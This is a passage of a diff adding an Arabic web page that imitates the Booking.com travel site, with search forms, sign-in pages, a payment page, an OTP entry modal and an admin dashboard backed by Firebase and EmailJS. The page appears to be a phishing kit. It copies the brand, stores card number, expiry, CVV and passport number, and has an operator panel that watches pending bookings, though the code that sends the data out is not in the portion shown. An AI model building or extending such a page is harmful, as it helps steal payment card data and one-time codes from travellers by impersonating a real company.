@@ -1,0 +1,1778 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Booking - وجهتك الأولى للحجوزات</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+    
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <style>
+        :root {
+            --booking-blue: #003580;
+            --booking-blue-light: #006ce4;
+            --booking-yellow: #febb02;
+            --booking-red: #e02d4b;
+            --booking-green: #008009;
+            --booking-bg: #f5f5f5;
+            --text-primary: #1a1a1a;
+            --text-secondary: #6b6b6b;
+            --border-color: #e0e0e0;
+        }
+        html { scroll-behavior: smooth; }
+        body { 
+            font-family: 'Cairo', sans-serif; 
+            background-color: var(--booking-bg); 
+            color: var(--text-primary);
+            padding-top: 120px; /* Adjust for fixed header */
+            padding-bottom: 80px; /* Adjust for fixed footer */
+        }
+        
+        /* General Styles */
+        .header-title { font-weight: 900; font-size: 2rem; color: white; letter-spacing: -1px; }
+        .main-tab-container { justify-content: center; }
+        .main-tab { border-bottom: 3px solid transparent; padding-bottom: 12px; margin-bottom: -2px; }
+        .main-tab.active { color: white; border-bottom-color: var(--booking-yellow); }
+        .search-container { border: 4px solid var(--booking-yellow); }
+
+        /* Page & Modal Transitions */
+        .page-container, .modal-container {
+            opacity: 0; visibility: hidden;
+            transition: opacity 0.3s, visibility 0.3s;
+        }
+        .page-container {
+            position: fixed; inset: 0; background-color: var(--booking-bg); z-index: 1000;
+            overflow-y: auto;
+        }
+        .modal-container {
+            position: fixed; inset: 0; z-index: 2000;
+            background-color: rgba(0,0,0,0.6);
+            display: flex; align-items: center; justify-content: center;
+        }
+        .page-container.active, .modal-container.active { opacity: 1; visibility: visible; }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+        .modal-content, .popup-content { animation: fadeIn 0.3s ease-out; }
+        
+        /* OTP Input Styling */
+        .otp-inputs { display: flex; gap: 10px; direction: ltr; }
+        .otp-inputs input { width: 45px; height: 50px; text-align: center; font-size: 1.5rem; border: 2px solid var(--border-color); border-radius: 8px; }
+        .otp-inputs input:focus { outline: none; border-color: var(--booking-blue-light); }
+        
+        /* Calendar Styling */
+        .day-selected { background-color: var(--booking-blue) !important; color: white !important; border-radius: 9999px !important; }
+        .day-in-range { background-color: #dbeafe !important; color: #1e3a8a !important; border-radius: 0 !important; }
+
+        /* Notifications */
+        .notification-dot {
+            position: absolute;
+            top: 6px;
+            right: 6px;
+            width: 10px;
+            height: 10px;
+            background-color: var(--booking-red);
+            border-radius: 50%;
+            border: 2px solid var(--booking-blue);
+        }
+
+        /* Favorite Icon Styling */
+        .favorite-btn.favorited .fa-heart {
+            color: var(--booking-red);
+            font-weight: 900; /* Makes it the solid version */
+        }
+
+        /* Autocomplete Styling */
+        .autocomplete-suggestions {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            max-height: 200px;
+            overflow-y: auto;
+            background: white;
+            border: 1px solid var(--border-color);
+            border-top: none;
+            border-radius: 0 0 8px 8px;
+            z-index: 100;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        .autocomplete-suggestion {
+            padding: 10px;
+            cursor: pointer;
+        }
+        .autocomplete-suggestion:hover {
+            background-color: #f0f0f0;
+        }
+
+        /* Hide scrollbar for webkit browsers */
+        .no-scrollbar::-webkit-scrollbar { display: none; }
+        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+
+        /* Slider Arrows */
+        .slider-arrow {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 40px;
+            height: 40px;
+            background-color: rgba(0, 0, 0, 0.5);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 10;
+            transition: background-color 0.2s;
+        }
+        .slider-arrow:hover {
+            background-color: rgba(0, 0, 0, 0.8);
+        }
+        .slider-arrow.right { right: -20px; }
+        .slider-arrow.left { left: -20px; }
+
+        /* Form Validation Error Styling */
+        .form-error-message {
+            color: var(--booking-red);
+            font-size: 0.875rem;
+            font-weight: bold;
+            text-align: right;
+            margin-top: 4px;
+        }
+        .input-error {
+            border-color: var(--booking-red) !important;
+        }
+    </style>
+</head>
+<body>
+    <div id="app-container">
+        <header class="fixed top-0 left-0 right-0 bg-[var(--booking-blue)] text-white p-4 z-50">
+            <div class="container mx-auto flex justify-between items-center relative">
+                <h1 class="header-title">Booking</h1>
+                <div class="flex items-center gap-4 text-xl">
+                    <button id="notificationsBtn" class="relative hover:bg-white/10 p-2 rounded-full transition"><i class="fas fa-bell"></i><span id="notification-dot" class="hidden notification-dot"></span></button>
+                    <button id="accountBtnHeader" class="hover:bg-white/10 p-2 rounded-full transition"><i class="fas fa-user-circle"></i></button>
+                    <button id="adminBtnHeader" class="hover:bg-white/10 p-2 rounded-full transition"><i class="fas fa-user-shield"></i></button>
+                </div>
+                <!-- Notifications Popup -->
+                <div id="notifications-popup" class="hidden popup-content absolute top-14 left-0 w-80 max-w-sm bg-white text-slate-800 rounded-lg shadow-2xl border z-[60]"></div>
+            </div>
+            <div class="bg-[var(--booking-blue)] border-b-2 border-white/20"><div class="container mx-auto flex items-center gap-6 px-4 pt-3 main-tab-container"><button data-search-type="stays" class="main-tab active flex items-center gap-2 p-1 font-bold transition text-base"><i class="fas fa-bed"></i><span>أماكن إقامة</span></button><button data-search-type="flights" class="main-tab flex items-center gap-2 p-1 font-bold transition text-base"><i class="fas fa-plane"></i><span>رحلات طيران</span></button></div></div>
+        </header>
+
+        <main id="mainContent" class="container mx-auto p-4 space-y-8">
+            <div id="search-widget-container" class="bg-transparent rounded-lg search-container"><div id="search-forms-container" class="p-4 bg-white rounded-md"></div></div>
+            
+            <div id="discover-content" class="space-y-8">
+                <div class="bg-white p-4 rounded-lg shadow-sm">
+                    <h2 class="text-2xl font-extrabold mb-4">عروض حصرية</h2>
+                    <div class="relative group">
+                        <div id="offers-slider-container" class="overflow-hidden">
+                            <div id="offers-slider" class="flex gap-4 overflow-x-auto snap-x snap-mandatory no-scrollbar" style="scroll-behavior: smooth;">
+                                 <div class="snap-start flex-shrink-0 w-80 bg-slate-200 animate-pulse rounded-lg h-48"></div>
+                                 <div class="snap-start flex-shrink-0 w-80 bg-slate-200 animate-pulse rounded-lg h-48"></div>
+                                 <div class="snap-start flex-shrink-0 w-80 bg-slate-200 animate-pulse rounded-lg h-48"></div>
+                            </div>
+                        </div>
+                        <button id="slide-left" class="slider-arrow left opacity-0 group-hover:opacity-100 transition-opacity"><i class="fas fa-chevron-left"></i></button>
+                        <button id="slide-right" class="slider-arrow right opacity-0 group-hover:opacity-100 transition-opacity"><i class="fas fa-chevron-right"></i></button>
+                    </div>
+                </div>
+                <div>
+                    <h2 class="text-2xl font-extrabold mb-4">تصفح حسب نوع مكان الإقامة</h2>
+                    <div id="property-types-grid" class="grid grid-cols-2 md:grid-cols-4 gap-4">
+                        <div data-action="search-property" data-type="فندق" class="relative rounded-lg overflow-hidden h-32 group cursor-pointer"><img src="https://images.unsplash.com/photo-1551882547-ff40c63fe5fa?q=80&w=2070&auto=format&fit=crop" class="w-full h-full object-cover transition-transform duration-300 group-hover:scale-110" alt="Hotel Lobby" onerror="this.onerror=null;this.src='https://placehold.co/800x600/e2e8f0/475569?text=Hotel';"><div class="absolute inset-0 bg-black/30 p-2 flex items-end"><h3 class="text-white font-bold text-lg">فنادق</h3></div></div>
+                        <div data-action="search-property" data-type="شقة" class="relative rounded-lg overflow-hidden h-32 group cursor-pointer"><img src="https://images.unsplash.com/photo-1616046229478-9901c5536a45?q=80&w=2070&auto=format&fit=crop" class="w-full h-full object-cover transition-transform duration-300 group-hover:scale-110" alt="Apartment Livingroom" onerror="this.onerror=null;this.src='https://placehold.co/800x600/e2e8f0/475569?text=Apartment';"><div class="absolute inset-0 bg-black/30 p-2 flex items-end"><h3 class="text-white font-bold text-lg">شقق</h3></div></div>
+                        <div data-action="search-property" data-type="منتجع" class="relative rounded-lg overflow-hidden h-32 group cursor-pointer"><img src="https://images.unsplash.com/photo-1571003123894-1f0594d2b5d9?q=80&w=1949&auto=format&fit=crop" class="w-full h-full object-cover transition-transform duration-300 group-hover:scale-110" alt="Resort Pool" onerror="this.onerror=null;this.src='https://placehold.co/800x600/e2e8f0/475569?text=Resort';"><div class="absolute inset-0 bg-black/30 p-2 flex items-end"><h3 class="text-white font-bold text-lg">منتجعات</h3></div></div>
+                        <div data-action="search-property" data-type="فيلا" class="relative rounded-lg overflow-hidden h-32 group cursor-pointer"><img src="https://images.unsplash.com/photo-1580587771525-78b9dba3b914?q=80&w=1974&auto=format&fit=crop" class="w-full h-full object-cover transition-transform duration-300 group-hover:scale-110" alt="Villa Exterior" onerror="this.onerror=null;this.src='https://placehold.co/800x600/e2e8f0/475569?text=Villa';"><div class="absolute inset-0 bg-black/30 p-2 flex items-end"><h3 class="text-white font-bold text-lg">فيلات</h3></div></div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer class="fixed bottom-0 left-0 right-0 bg-white py-1 px-2 border-t z-50">
+            <div class="container mx-auto flex justify-around items-start text-center">
+                <button id="searchBtnFooter" class="text-[var(--booking-blue-light)] flex flex-col items-center justify-center gap-1 w-1/4 p-1">
+                    <i class="fas fa-search text-xl"></i>
+                    <span class="text-xs font-bold whitespace-nowrap">بحث</span>
+                </button>
+                <button id="favoritesBtnFooter" class="text-[var(--text-secondary)] hover:text-[var(--booking-blue-light)] flex flex-col items-center justify-center gap-1 w-1/4 p-1">
+                    <i class="far fa-heart text-xl"></i>
+                    <span class="text-xs font-bold whitespace-nowrap">المحفوظات</span>
+                </button>
+                <button id="bookingsBtnFooter" class="text-[var(--text-secondary)] hover:text-[var(--booking-blue-light)] flex flex-col items-center justify-center gap-1 w-1/4 p-1">
+                    <i class="fas fa-briefcase text-xl"></i>
+                    <span class="text-xs font-bold whitespace-nowrap">حجوزاتي</span>
+                </button>
+                <button id="accountBtnFooter" class="text-[var(--text-secondary)] hover:text-[var(--booking-blue-light)] flex flex-col items-center justify-center gap-1 w-1/4 p-1">
+                    <i class="far fa-user-circle text-xl"></i>
+                    <span class="text-xs font-bold whitespace-nowrap">حسابي</span>
+                </button>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Page Containers -->
+    <div id="signInPage" class="page-container"></div>
+    <div id="signUpPage" class="page-container"></div>
+    <div id="forgotPasswordPage" class="page-container"></div>
+    <div id="dashboardPage" class="page-container"></div>
+    <div id="accountDetailsPage" class="page-container"></div>
+    <div id="bookingDetailsPage" class="page-container"></div>
+    <div id="favoritesPage" class="page-container"></div>
+    <div id="passportPage" class="page-container"></div>
+    <div id="paymentPage" class="page-container"></div>
+    <div id="searchResultsPage" class="page-container"></div>
+    <div id="adminLoginPage" class="page-container"></div>
+    <div id="adminDashboardPage" class="page-container"></div>
+    
+    <!-- Modal Containers -->
+    <div id="datePickerModal" class="modal-container p-4"></div>
+    <div id="countryCodeModal" class="modal-container p-4"></div>
+    <div id="passengerModal" class="modal-container p-4"></div>
+    <div id="guestModal" class="modal-container p-4"></div>
+    <div id="otpModal" class="modal-container p-4"></div>
+    <div id="resultModal" class="modal-container p-4"></div>
+    <div id="loadingModal" class="modal-container p-4"></div>
+
+
+<script type="module">
+    // --- Firebase Imports ---
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+    import { getFirestore, collection, getDocs, doc, updateDoc, writeBatch, onSnapshot, setDoc, addDoc, query, where, deleteDoc, getDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+    import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+
+    // --- App ID for constructing Firestore paths ---
+    const appId = typeof __app_id !== 'undefined' ? __app_id : '1:666361598120:web:8eb42070c3a56dea87b29d';
+
+    // --- Firebase Initialization ---
+    let db, auth;
+    let unsubscribeFromPendingBooking = null; // To hold the listener unsub function
+    let unsubscribeFromAdminBookings = null; // To hold the admin listener
+
+    // --- Function now returns a promise that resolves when auth is ready ---
+    function initializeFirebase() {
+        return new Promise((resolve, reject) => {
+            try {
+                const firebaseConfig = typeof __firebase_config !== 'undefined'
+                    ? JSON.parse(__firebase_config)
+                    : { // Fallback to user's provided config if environment one is missing
+                        apiKey: "AIzaSyD8De6ejpve1Lj0b5qzXM05v8RYbmNSQUw",
+                        authDomain: "booking-e0cc4.firebaseapp.com",
+                        projectId: "booking-e0cc4",
+                        storageBucket: "booking-e0cc4.appspot.com",
+                        messagingSenderId: "666361598120",
+                        appId: "1:666361598120:web:8eb42070c3a56dea87b29d",
+                        measurementId: "G-3P6RBHYW69"
+                    };
+                const initialAuthToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null;
+
+                const app = initializeApp(firebaseConfig);
+                db = getFirestore(app);
+                auth = getAuth(app);
+
+                // Use onAuthStateChanged to know when authentication is complete
+                const unsubscribe = onAuthStateChanged(auth, async (user) => {
+                    unsubscribe(); // Unsubscribe after the first state change
+                    if (user) {
+                        console.log("Firebase Authenticated:", user.uid);
+                        resolve();
+                    } else if (initialAuthToken) {
+                        try {
+                            await signInWithCustomToken(auth, initialAuthToken);
+                            console.log("Firebase Authenticated with Custom Token:", auth.currentUser.uid);
+                            resolve();
+                        } catch (error) {
+                            console.error("Custom Token Sign-In Error:", error);
+                            reject(error);
+                        }
+                    } else {
+                        try {
+                            await signInAnonymously(auth);
+                            console.log("Firebase Authenticated Anonymously:", auth.currentUser.uid);
+                            resolve();
+                        } catch (error) {
+                             console.error("Anonymous Sign-In Error:", error);
+                             reject(error);
+                        }
+                    }
+                });
+
+            } catch (error) {
+                console.error("Firebase Initialization Error:", error);
+                reject(error);
+            }
+        });
+    }
+
+
+    document.addEventListener('DOMContentLoaded', async function () {
+        
+        try {
+            // --- Wait for Firebase to be fully initialized and authenticated ---
+            await initializeFirebase();
+        } catch (error) {
+            console.error("Could not initialize the app due to authentication failure.", error);
+            // Optionally, show an error message to the user on the page
+            document.body.innerHTML = `<div class="text-center p-8"><h1>فشل تهيئة التطبيق</h1><p>حدث خطأ أثناء الاتصال بخدمات المصادقة. يرجى المحاولة مرة أخرى لاحقًا.</p></div>`;
+            return; // Stop execution if Firebase fails
+        }
+        
+        // --- State Management ---
+        let userState = { 
+            loggedIn: false, name: null, email: null, bookings: [], favorites: [],
+            notifications: { lastId: 0, unreadCount: 0, items: [] } 
+        };
+        let bookingState = {
+            selectedItem: null,
+            calculatedPrice: 0,
+            fullName: '',
+            passportNumber: '',
+            cardNumber: '',
+            expiry: '',
+            cvv: '',
+            pendingBookingId: null // NEW: To track the current pending booking
+        };
+        let activeDateSelection = { input: null, departure: new Date(), return: new Date(new Date().setDate(new Date().getDate() + 1)), isSelectingDeparture: true };
+        let adminState = { 
+            loggedIn: false,
+            notifications: { lastId: 0, unreadCount: 0, items: [] } 
+        };
+        let liveData = { flights: [], stays: [] };
+        
+        // --- Global Constants ---
+        const monthNames = ["يناير", "فبراير", "مارس", "أبريل", "مايو", "يونيو", "يوليو", "أغسطس", "سبتمبر", "أكتوبر", "نوفمبر", "ديسمبر"];
+        const dayNames = ["الأحد", "الاثنين", "الثلاثاء", "الأربعاء", "الخميس", "الجمعة", "السبت"];
+        const countryData = [
+            { name: 'Afghanistan', code: '+93', flag: 'af' }, { name: 'Albania', code: '+355', flag: 'al' },
+            { name: 'Algeria', code: '+213', flag: 'dz' }, { name: 'Andorra', code: '+376', flag: 'ad' },
+            { name: 'Angola', code: '+244', flag: 'ao' }, { name: 'Argentina', code: '+54', flag: 'ar' },
+            { name: 'Armenia', code: '+374', flag: 'am' }, { name: 'Australia', code: '+61', flag: 'au' },
+            { name: 'Austria', code: '+43', flag: 'at' }, { name: 'Azerbaijan', code: '+994', flag: 'az' },
+            { name: 'Bahrain', code: '+973', flag: 'bh' }, { name: 'Bangladesh', code: '+880', flag: 'bd' },
+            { name: 'Belarus', code: '+375', flag: 'by' }, { name: 'Belgium', code: '+32', flag: 'be' },
+            { name: 'Bolivia', code: '+591', flag: 'bo' }, { name: 'Brazil', code: '+55', flag: 'br' },
+            { name: 'Bulgaria', code: '+359', flag: 'bg' }, { name: 'Canada', code: '+1', flag: 'ca' },
+            { name: 'Chile', code: '+56', flag: 'cl' }, { name: 'China', code: '+86', flag: 'cn' },
+            { name: 'Colombia', code: '+57', flag: 'co' }, { name: 'Croatia', code: '+385', flag: 'hr' },
+            { name: 'Cuba', code: '+53', flag: 'cu' }, { name: 'Cyprus', code: '+357', flag: 'cy' },
+            { name: 'Czech Republic', code: '+420', flag: 'cz' }, { name: 'Denmark', code: '+45', flag: 'dk' },
+            { name: 'Egypt', code: '+20', flag: 'eg' }, { name: 'Estonia', code: '+372', flag: 'ee' },
+            { name: 'Finland', code: '+358', flag: 'fi' }, { name: 'France', code: '+33', flag: 'fr' },
+            { name: 'Georgia', code: '+995', flag: 'ge' }, { name: 'Germany', code: '+49', flag: 'de' },
+            { name: 'Greece', code: '+30', flag: 'gr' }, { name: 'Hungary', code: '+36', flag: 'hu' },
+            { name: 'Iceland', code: '+354', flag: 'is' }, { name: 'India', code: '+91', flag: 'in' },
+            { name: 'Indonesia', code: '+62', flag: 'id' }, { name: 'Iran', code: '+98', flag: 'ir' },
+            { name: 'Iraq', code: '+964', flag: 'iq' }, { name: 'Ireland', code: '+353', flag: 'ie' },
+            { name: 'Italy', code: '+39', flag: 'it' }, { name: 'Japan', code: '+81', flag: 'jp' },
+            { name: 'Jordan', code: '+962', flag: 'jo' }, { name: 'Kazakhstan', code: '+7', flag: 'kz' },
+            { name: 'Kuwait', code: '+965', flag: 'kw' }, { name: 'Lebanon', code: '+961', flag: 'lb' },
+            { name: 'Libya', code: '+218', flag: 'ly' }, { name: 'Malaysia', code: '+60', flag: 'my' },
+            { name: 'Mexico', code: '+52', flag: 'mx' }, { name: 'Morocco', code: '+212', flag: 'ma' },
+            { name: 'Netherlands', code: '+31', flag: 'nl' }, { name: 'New Zealand', code: '+64', flag: 'nz' },
+            { name: 'Nigeria', code: '+234', flag: 'ng' }, { name: 'Norway', code: '+47', flag: 'no' },
+            { name: 'Oman', code: '+968', flag: 'om' }, { name: 'Pakistan', code: '+92', flag: 'pk' },
+            { name: 'Palestine', code: '+970', flag: 'ps' }, { name: 'Peru', code: '+51', flag: 'pe' },
+            { name: 'Philippines', code: '+63', flag: 'ph' }, { name: 'Poland', code: '+48', flag: 'pl' },
+            { name: 'Portugal', code: '+351', flag: 'pt' }, { name: 'Qatar', code: '+974', flag: 'qa' },
+            { name: 'Romania', code: '+40', flag: 'ro' }, { name: 'Russia', code: '+7', flag: 'ru' },
+            { name: 'Saudi Arabia', code: '+966', flag: 'sa' }, { name: 'Serbia', code: '+381', flag: 'rs' },
+            { name: 'Singapore', code: '+65', flag: 'sg' }, { name: 'South Africa', code: '+27', flag: 'za' },
+            { name: 'South Korea', code: '+82', flag: 'kr' }, { name: 'Spain', code: '+34', flag: 'es' },
+            { name: 'Sudan', code: '+249', flag: 'sd' }, { name: 'Sweden', code: '+46', flag: 'se' },
+            { name: 'Switzerland', code: '+41', flag: 'ch' }, { name: 'Syria', code: '+963', flag: 'sy' },
+            { name: 'Thailand', code: '+66', flag: 'th' }, { name: 'Tunisia', code: '+216', flag: 'tn' },
+            { name: 'Turkey', code: '+90', flag: 'tr' }, { name: 'Ukraine', code: '+380', flag: 'ua' },
+            { name: 'United Arab Emirates', code: '+971', flag: 'ae' }, { name: 'United Kingdom', code: '+44', flag: 'gb' },
+            { name: 'United States', code: '+1', flag: 'us' }, { name: 'Yemen', code: '+967', flag: 'ye' }
+        ];
+        
+        // --- DOM Elements ---
+        const searchFormsContainer = document.getElementById('search-forms-container');
+        const pages = { 
+            signIn: document.getElementById('signInPage'), signUp: document.getElementById('signUpPage'), 
+            forgotPassword: document.getElementById('forgotPasswordPage'), dashboard: document.getElementById('dashboardPage'), 
+            accountDetails: document.getElementById('accountDetailsPage'), bookingDetails: document.getElementById('bookingDetailsPage'), 
+            favorites: document.getElementById('favoritesPage'), passport: document.getElementById('passportPage'), 
+            payment: document.getElementById('paymentPage'), searchResults: document.getElementById('searchResultsPage'),
+            adminLogin: document.getElementById('adminLoginPage'), adminDashboard: document.getElementById('adminDashboardPage')
+        };
+        const modals = { datePicker: document.getElementById('datePickerModal'), countryCode: document.getElementById('countryCodeModal'), passenger: document.getElementById('passengerModal'), guest: document.getElementById('guestModal'), otp: document.getElementById('otpModal'), result: document.getElementById('resultModal'), loading: document.getElementById('loadingModal') };
+        const popups = { notifications: document.getElementById('notifications-popup') };
+
+        // --- Helper Functions ---
+        function formatDate(date) { return date ? `${dayNames[date.getDay()]}, ${date.getDate()} ${monthNames[date.getMonth()]}` : ''; }
+        
+        function getSeason(date) {
+            const month = date.getMonth(); // 0 = January, 11 = December
+            if ([5, 6, 7, 11].includes(month)) return 'high'; // June, July, August, December
+            if ([2, 3, 4, 8, 9, 10].includes(month)) return 'mid'; // March, April, May, Sep, Oct, Nov
+            return 'low'; // Jan, Feb
+        }
+
+        function showInputError(element, message) {
+            clearInputError(element); // Clear previous error first
+            element.classList.add('input-error');
+            const errorElement = document.createElement('p');
+            errorElement.className = 'form-error-message';
+            errorElement.textContent = message;
+            // Insert the error message after the element that has the error
+            element.parentNode.insertBefore(errorElement, element.nextSibling);
+        }
+
+        function clearInputError(element) {
+            if (!element) return; // Guard clause
+            element.classList.remove('input-error');
+            const nextSibling = element.nextElementSibling;
+            // Check if the next sibling is an error message and remove it
+            if (nextSibling && nextSibling.classList.contains('form-error-message')) {
+                nextSibling.remove();
+            }
+        }
+
+
+        // --- HTML Templates ---
+        const flightsFormHTML = (params = {}) => `<form id="flights-form" class="search-form-panel hidden space-y-3">
+            <div class="relative"><i class="fa fa-plane-departure absolute top-1/2 -translate-y-1/2 right-3 text-slate-400"></i><input type="text" name="from" placeholder="المغادرة من" class="w-full border-2 bg-slate-100 rounded-lg p-3 pr-10 text-base" value="${params.from || ''}" autocomplete="off"></div>
+            <div class="relative"><i class="fa fa-plane-arrival absolute top-1/2 -translate-y-1/2 right-3 text-slate-400"></i><input type="text" name="to" placeholder="الوجهة إلى" class="w-full border-2 bg-slate-100 rounded-lg p-3 pr-10 text-base" value="${params.to || ''}" autocomplete="off"></div>
+            <div class="grid grid-cols-2 gap-3">
+                <div class="relative"><i class="fa fa-calendar-day absolute top-1/2 -translate-y-1/2 right-3 text-slate-400"></i><input type="text" id="flightDepartureDate" readonly class="date-input w-full border-2 bg-slate-100 rounded-lg p-3 pr-10 cursor-pointer" placeholder="تاريخ المغادرة" value="${formatDate(params.departureDate)}"></div>
+                <div class="relative"><i class="fa fa-calendar-day absolute top-1/2 -translate-y-1/2 right-3 text-slate-400"></i><input type="text" id="flightReturnDate" readonly class="date-input w-full border-2 bg-slate-100 rounded-lg p-3 pr-10 cursor-pointer" placeholder="تاريخ العودة" value="${formatDate(params.returnDate)}"></div>
+            </div>
+            <div class="relative"><i class="fa fa-user-friends absolute top-1/2 -translate-y-1/2 right-3 text-slate-400"></i><input type="text" id="passenger-input" readonly class="w-full border-2 bg-slate-100 rounded-lg p-3 pr-10 cursor-pointer" value="${params.adults || 1} بالغون، ${params.children || 0} أطفال"></div>
+            <button type="submit" class="w-full bg-[var(--booking-blue-light)] text-white text-lg font-bold p-3 rounded-lg hover:bg-[var(--booking-blue)] transition-colors">ابحث</button>
+        </form>`;
+        
+        const staysFormHTML = (params = {}) => `<form id="stays-form" class="search-form-panel hidden space-y-3">
+            <div class="relative"><i class="fa fa-map-marker-alt absolute top-1/2 -translate-y-1/2 right-3 text-slate-400"></i><input type="text" name="destination" placeholder="أين تريد الذهاب؟" class="w-full border-2 bg-slate-100 rounded-lg p-3 pr-10 text-base" value="${params.destination || ''}" autocomplete="off"></div>
+            <div class="grid grid-cols-2 gap-3">
+                <div class="relative"><i class="fa fa-calendar-day absolute top-1/2 -translate-y-1/2 right-3 text-slate-400"></i><input type="text" id="stayCheckinDate" readonly class="date-input w-full border-2 bg-slate-100 rounded-lg p-3 pr-10 cursor-pointer" placeholder="تاريخ الوصول" value="${formatDate(params.checkinDate)}"></div>
+                <div class="relative"><i class="fa fa-calendar-day absolute top-1/2 -translate-y-1/2 right-3 text-slate-400"></i><input type="text" id="stayCheckoutDate" readonly class="date-input w-full border-2 bg-slate-100 rounded-lg p-3 pr-10 cursor-pointer" placeholder="تاريخ المغادرة" value="${formatDate(params.checkoutDate)}"></div>
+            </div>
+            <div class="relative"><i class="fa fa-users absolute top-1/2 -translate-y-1/2 right-3 text-slate-400"></i><input type="text" id="guest-input" readonly class="w-full border-2 bg-slate-100 rounded-lg p-3 pr-10 cursor-pointer" value="${params.rooms || 1} غرف، ${params.adults || 2} بالغون، ${params.children || 0} أطفال"></div>
+            <button type="submit" class="w-full bg-[var(--booking-blue-light)] text-white text-lg font-bold p-3 rounded-lg hover:bg-[var(--booking-blue)] transition-colors">ابحث</button>
+        </form>`;
+        
+        const signInPageHTML = `<div class="w-full max-w-lg mx-auto p-4 text-center"><div class="flex justify-between items-center mb-8"><span class="w-8"></span><i class="fas fa-suitcase-rolling text-4xl text-slate-300"></i><button class="back-btn text-3xl text-slate-400">&times;</button></div><h2 class="text-2xl font-bold mb-2">سجّل دخولك للاطلاع على حجوزاتك</h2><p class="text-slate-500 mb-8">يمكنك التعرّف على عروضنا الحصرية، حفظ معلومات المسافرين وإدارة حجوزاتك في المستقبل معنا!</p><form id="signInForm" class="space-y-4 text-right"><div class="space-y-4"><div><label class="font-bold block mb-2">البريد الإلكتروني</label><div class="relative"><input type="email" name="email" placeholder="example@mail.com" class="w-full border-2 rounded-lg p-3 text-lg text-right"></div></div><div><label class="font-bold block mb-2">كلمة المرور</label><div class="relative"><input type="password" name="password" placeholder="كلمة المرور" class="w-full border-2 rounded-lg p-3 text-lg pr-12"><i class="fas fa-eye-slash password-toggle-icon absolute top-1/2 right-4 -translate-y-1/2 text-slate-400 cursor-pointer"></i></div></div></div><p id="signInError" class="text-red-500 text-sm font-bold hidden text-center">الرجاء إدخال بياناتك بشكل صحيح.</p><button type="submit" class="w-full bg-[var(--booking-blue-light)] text-white font-bold py-4 rounded-lg text-lg mt-6">تسجيل الدخول</button></form><a href="#" data-action="show-forgot-password" class="block my-6 font-bold text-[var(--booking-blue-light)]">هل نسيت كلمة المرور؟</a><div class="my-6 flex items-center gap-4"><hr class="flex-grow"><span class="text-slate-400">أو</span><hr class="flex-grow"></div><p class="mt-8 text-slate-500">ليس لديك حساب؟ <a href="#" data-action="show-sign-up" class="font-bold text-[var(--booking-blue-light)]">إنشاء حساب جديد</a></p></div>`;
+        const signUpPageHTML = `<div class="w-full max-w-lg mx-auto p-4 text-center"><div class="flex justify-between items-center mb-8"><span class="w-8"></span><i class="fas fa-user-plus text-4xl text-slate-300"></i><button class="back-btn text-3xl text-slate-400" data-target="signIn">&times;</button></div><h2 class="text-2xl font-bold mb-2">إنشاء حساب جديد</h2><p class="text-slate-500 mb-8">خطوة واحدة تفصلك عن عالم من العروض الحصرية!</p><form id="signUpForm" class="space-y-4 text-right"><div><label class="font-bold block mb-2">الاسم الكامل</label><input type="text" name="fullName" required placeholder="مثال: سيف الدين محمد" class="w-full border-2 rounded-lg p-3 text-lg text-right"></div><div><label class="font-bold block mb-2">البريد الإلكتروني</label><input type="email" name="email" required placeholder="example@mail.com" class="w-full border-2 rounded-lg p-3 text-lg text-right"></div><div><label class="font-bold block mb-2">كلمة المرور</label><div class="relative"><input type="password" name="password" required placeholder="••••••••" class="w-full border-2 rounded-lg p-3 text-lg pr-12"><i class="fas fa-eye-slash password-toggle-icon absolute top-1/2 right-4 -translate-y-1/2 text-slate-400 cursor-pointer"></i></div></div><button type="submit" class="w-full bg-[var(--booking-blue-light)] text-white font-bold py-4 rounded-lg text-lg">إنشاء حساب</button></form></div>`;
+        const forgotPasswordPageHTML = `<div class="w-full max-w-lg mx-auto p-4 text-center"><div class="flex justify-between items-center mb-8"><span class="w-8"></span><i class="fas fa-key text-4xl text-slate-300"></i><button class="back-btn text-3xl text-slate-400" data-target="signIn">&times;</button></div><h2 class="text-2xl font-bold mb-2">هل نسيت كلمة المرور؟</h2><p class="text-slate-500 mb-8">لا تقلق، أدخل بريدك الإلكتروني وسنرسل لك رابطاً لإعادة تعيينها.</p><form id="forgotPasswordForm" class="space-y-4 text-right"><div class="relative"><label class="font-bold block mb-2">البريد الإلكتروني</label><input type="email" name="email" required placeholder="example@mail.com" class="w-full border-2 rounded-lg p-3 text-lg text-right"></div><button type="submit" class="w-full bg-[var(--booking-blue-light)] text-white font-bold py-4 rounded-lg text-lg">إرسال</button></form></div>`;
+        
+        const dashboardPageHTML = (name, bookings) => {
+            let content;
+            if (bookings.length === 0) {
+                content = `<div class="text-center bg-white rounded-lg p-10 shadow-md">
+                                <i class="fas fa-briefcase text-6xl text-slate-300 mb-4"></i>
+                                <h3 class="text-xl font-bold mb-2">لا توجد لديك حجوزات بعد يا ${name}</h3>
+                                <p class="text-slate-500 mb-6">عندما تقوم بالحجز، ستظهر تفاصيل رحلتك هنا.</p>
